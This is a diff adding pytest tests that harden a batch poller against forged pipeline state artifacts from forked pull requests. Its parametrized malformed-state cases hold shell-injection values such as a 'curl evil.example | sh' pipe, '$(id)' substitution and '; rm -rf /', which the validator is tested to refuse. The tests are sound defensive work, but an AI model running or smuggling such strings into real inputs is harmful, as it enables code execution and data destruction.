@@ -303,3 +303,70 @@ def test_malformed_wait_ceiling_falls_back_to_24h_basis(monkeypatch):
     monkeypatch.setenv("PYTHIA_BATCH_MAX_WAIT_H", "not-a-number")
     covered = poll_llm_batches._max_chain() * poll_llm_batches.POLLER_TICK_MINUTES / 60.0
     assert covered > 24.0
+
+
+# ---------------------------------------------------------------------------
+# Public-repo hardening (security PR 4). A fork can open a pull request from a
+# branch it named `main` and upload a pythia-batch-state artifact; without a
+# check the poller would dispatch whatever that artifact said.
+# ---------------------------------------------------------------------------
+
+
+def _good_state(**overrides):
+    state = {
+        "pipeline_id": "hs_20261001T000000",
+        "next_stage": "hs_rc_collect",
+        "db_run_id": "123456789",
+        "dispatch_inputs": {
+            "batch_providers": "openai,anthropic,google",
+            "only_countries": "IRN,SOM",
+            "grounding_primary": "brave",
+            "disable_brave": "false",
+        },
+    }
+    state.update(overrides)
+    return state
+
+
+def test_a_well_formed_state_passes():
+    assert poll_llm_batches.state_problem(_good_state()) is None
+    assert poll_llm_batches.state_problem(_good_state(pipeline_id="pl_1790000000")) is None
+    # A state written before dispatch_inputs existed is still well formed.
+    assert poll_llm_batches.state_problem(_good_state(dispatch_inputs=None)) is None
+
+
+@pytest.mark.parametrize(
+    "overrides",
+    [
+        {"pipeline_id": 'hs_1"; curl evil.example | sh; echo "'},
+        {"pipeline_id": "$(id)"},
+        {"pipeline_id": ""},
+        {"db_run_id": "123; rm -rf /"},
+        {"next_stage": "deploy_everything"},
+        {"dispatch_inputs": {"only_countries": "IRN$(id)"}},
+        {"dispatch_inputs": {"grounding_primary": "evil"}},
+        {"dispatch_inputs": "not a mapping"},
+    ],
+)
+def test_a_malformed_state_is_refused(overrides):
+    assert poll_llm_batches.state_problem(_good_state(**overrides)) is not None
+
+
+def test_runs_a_pull_request_started_are_never_listed(monkeypatch):
+    runs = [
+        {"databaseId": 1, "event": "pull_request", "conclusion": "success"},
+        {"databaseId": 2, "event": "pull_request_target", "conclusion": "success"},
+        {"databaseId": 3, "event": "workflow_dispatch", "conclusion": "success"},
+        {"databaseId": 4, "event": "schedule", "conclusion": "success"},
+    ]
+    seen = {}
+
+    def fake_gh(*args):
+        seen["args"] = args
+        import json as _json
+        return _json.dumps(runs)
+
+    monkeypatch.setattr(poll_llm_batches, "_gh", fake_gh)
+    listed = poll_llm_batches._list_runs("Pythia Pipeline Stage")
+    assert [r["databaseId"] for r in listed] == [3, 4]
+    assert "event" in seen["args"][seen["args"].index("--json") + 1]
